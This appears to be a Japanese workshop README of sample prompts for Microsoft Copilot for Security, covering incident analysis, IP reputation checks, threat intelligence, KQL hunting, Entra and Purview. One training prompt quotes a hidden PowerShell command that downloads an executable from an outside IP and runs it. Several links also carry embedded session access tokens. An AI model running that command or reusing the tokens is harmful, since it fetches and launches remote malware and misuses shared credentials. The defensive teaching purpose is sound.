![Security CoPilot Logo](https://github.com/ninjyanaka/Copilot-For-Security/blob/main/Promptbook%20samples/ic_fluent_copilot_64_64%402x.png)
# Microsoft Copilot for Security Workshop

***
&nbsp;
## ハンズオンシナリオ➁ インシデント分析編

 ```
Microsoft Defender XDRから、優先すべき重大度の高いインシデントの上位5件を教えて
 ```
 ```
Defender XDR Incident 50 について教えて
 ```
 ```
Defender XDR Incident 50 に関連するエンティティについて教えて
 ```
 ```
MDTIを使用して、このIPアドレス 185.220.101.86 のレピュテーションスコアを教えて
 ```
 ```
VirusTotal を使用して、このIPアドレス 185.220.101.86 のレピュテーションスコアを教えて
 ```
 ```
調査結果をエグゼクティブ・レポートにまとめて
 ```

プロンプト例：このプロンプトはWorkShop参加者の方のみ参照可能です。
[サンプルプロンプト]()

***
&nbsp;
## ハンズオンシナリオ➁　スクリプト分析編

 ```
以下のスクリプトは、どのような動作をするのか、順を追って説明し、その意図を推測してください
Script:powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://185.82.217.3/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'\\invoice.exe'
 ```

プロンプト例：このプロンプトはWorkShop参加者の方のみ参照可能です。
[サンプルプロンプト](https://securitycopilot.microsoft.com/sessions/7fd4c1dc-ed79-4744-b255-8fae70757085?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiODZlZGIwZDYtYzM1NC00ZjI5LTk5ZTAtZmVmYTg5MzZhZWE3IiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6IjdmZDRjMWRjLWVkNzktNDc0NC1iMjU1LThmYWU3MDc1NzA4NSIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI1Mjg2ODI2LCJleHAiOjIwNDA4MTk2MjYsImlhdCI6MTcyNTI4NjgyNiwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.LHPhIaJhFDaKt6fYc0648wd6L3i83pE020cmO0QIARg)

***
&nbsp;
## ハンズオンシナリオ➁　脅威インテリジェンス編

 ```
私はセキュリティエンジニアです。攻撃アクターグループ Volt Typhoon について教えて
 ```

プロンプト例：このプロンプトはWorkShop参加者の方のみ参照可能です。
[サンプルプロンプト](https://securitycopilot.microsoft.com/sessions/d986e587-9322-4a69-ab2c-54aa9082bd98?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiMDA5OTEzMTctOTQzZS00NjkxLWI3OTAtMWRiNTBhODA0YjM4IiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6ImQ5ODZlNTg3LTkzMjItNGE2OS1hYjJjLTU0YWE5MDgyYmQ5OCIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI1Mjg2NzcwLCJleHAiOjIwNDA4MTk1NzAsImlhdCI6MTcyNTI4Njc3MCwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.2G4R-9SMGjvnS88ar6u9k-6u5kvf98hKvBL6zBiuQg8)

***
&nbsp;
## ハンズオンシナリオ➂　Azure AI Search、ファイル
Azure AI Search
```
Azure AI Search プラグインを使用して、インシデントの対応手順を教えて
```

ファイル
```
ユーザー test04@MngEnvMCAP616855.onmicrosoft.comについて教えて
```
```
ファイル　危険なユーザー一覧を参照して、このユーザーが危険なのか教えて
```

プロンプト例：このプロンプトはWorkShop参加者の方のみ参照可能です。
[サンプルプロンプト](https://securitycopilot.microsoft.com/sessions/534cdd83-fd24-4d60-a6c6-fcdca72f6559?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiMWY1MmM2M2YtNzk3Yy00YjZhLWI0YmEtMmQ1ZGNjZGQzMmYxIiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6IjUzNGNkZDgzLWZkMjQtNGQ2MC1hNmM2LWZjZGNhNzJmNjU1OSIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI1Mjg2NjY2LCJleHAiOjIwNDA4MTk0NjYsImlhdCI6MTcyNTI4NjY2NiwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.P2aR8Bb8JGKo9Pwdtv1ZIsHXWF4AVFto8a0WJpodotI)

***
&nbsp;
## ハンズオンシナリオ➂　アドバンスドハンティング　KQL

```
’Cobalt Strike’ のIOCに関連した通信を探して
```

***
&nbsp;
## ハンズオンシナリオ➃　Entra

```
先週、疑わしい、あるいは不可能な移動があった個人アカウントは？
```

***
&nbsp;
## ハンズオンシナリオ➄　Purview

```
Microsoft Purview から、優先すべき重大度の高いアラートの上位5件を教えて
```
```
アラートID　dl13063524-3948-d713-2a00-08dcbd250086　について教えて
```
```
調査結果をエグゼクティブ・レポートにまとめて
```
プロンプト例：このプロンプトはWorkShop参加者の方のみ参照可能です。
[サンプルプロンプト](https://securitycopilot.microsoft.com/sessions/aa67d492-183a-4f52-961b-ceca51d406f2?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiZjc0N2U4Y2YtNThkYS00ZDYxLTg0NGYtZTc5MDhhNWVjYjAzIiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6ImFhNjdkNDkyLTE4M2EtNGY1Mi05NjFiLWNlY2E1MWQ0MDZmMiIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI1Mjg2MzE4LCJleHAiOjIwNDA4MTkxMTgsImlhdCI6MTcyNTI4NjMxOCwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.w1kkYdfPAOyDtWUODxQw3NbKkQrtolQMvE66uUuY--A)

